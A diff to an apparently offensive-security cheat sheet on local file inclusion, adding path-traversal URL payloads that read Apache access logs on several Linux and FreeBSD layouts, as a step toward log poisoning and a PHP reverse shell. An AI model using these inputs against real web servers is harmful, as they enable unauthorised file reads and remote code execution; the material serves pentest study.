@@ -50,8 +50,18 @@ render_with_liquid: false
 
 1. **Check if You Can Access the Apache Log File**
 
-    ```
-    /index.php?page=../../../../var/log/apache2/access.log
+    ```sh
+    # Debian, Ubuntu Linux
+    /?page=/var/log/apache/access.log
+    /?page=../../../../var/log/apache/access.log
+    /?page=/var/log/apache2/access.log
+    /?page=../../../../var/log/apache2/access.log
+    # FreeBSD Linux
+    /?page=/var/log/httpd-access.log
+    /?page=../../../../var/log/httpd-access.log
+    # CentOS, Fedora, RedHat Linux
+    /?page=/var/log/httpd/access_log
+    /?page=../../../../var/log/httpd/access_log
     ```
 
 2. **Prepare the Payload for PHP Reverse Shell**
